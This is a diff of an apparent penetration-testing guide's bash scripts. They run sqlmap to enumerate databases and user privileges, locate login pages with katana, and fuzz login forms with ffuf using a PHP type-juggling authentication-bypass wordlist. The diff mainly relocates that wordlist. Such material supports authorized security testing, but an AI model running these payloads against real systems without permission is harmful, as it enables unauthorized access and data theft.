@@ -559,7 +559,6 @@ else
         --not-string="invalid\|incorrect\|failed\|error\|denied" \
         --dbs --banner --current-user --current-db --is-dba
 fi
-
 ```
 
 {% hint style="info" %}
@@ -614,25 +613,6 @@ for pkg in $DEPS; do
         apt install -y "$pkg"
     fi
 done
-
-# Wordlist – Type Juggling Payloads
-cat <<EOF > "/tmp/type-juggling.txt"
-0
-0e0
-0e12345
-0e215962017
-0e11111111
-0e1294123
-null
-NULL
-true
-false
-"0"
-"0e0"
-"null"
-[]
-{}
-EOF
 
 # Find Login Page
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
@@ -732,20 +712,40 @@ HEADERS=(
   -H "Priority: u=0, i"
 )
 
+# Auth Bypass Header
+payload_list="payloads.txt"
+cat > $payload_list << EOF
+0
+0e0
+0e12345
+0e215962017
+0e11111111
+0e1294123
+null
+NULL
+true
+false
+"0"
+"0e0"
+"null"
+[]
+{}
+EOF
+​
 # Run FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL" \
-         -w "/tmp/type-juggling.txt:FUZZ1" \
-         -w "/tmp/type-juggling.txt:FUZZ2" \
+         -w "$payload_list:FUZZ1" \
+         -w "$payload_list:FUZZ2" \
          -X GET \
          -ac -c -r \
          -mc 200 \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
-         -w "/tmp/type-juggling.txt:FUZZ1" \
-         -w "/tmp/type-juggling.txt:FUZZ2" \
+         -w "$payload_list:FUZZ1" \
+         -w "$payload_list:FUZZ2" \
          -X POST \
          -d "$DATA" \
          -ac -c -r \
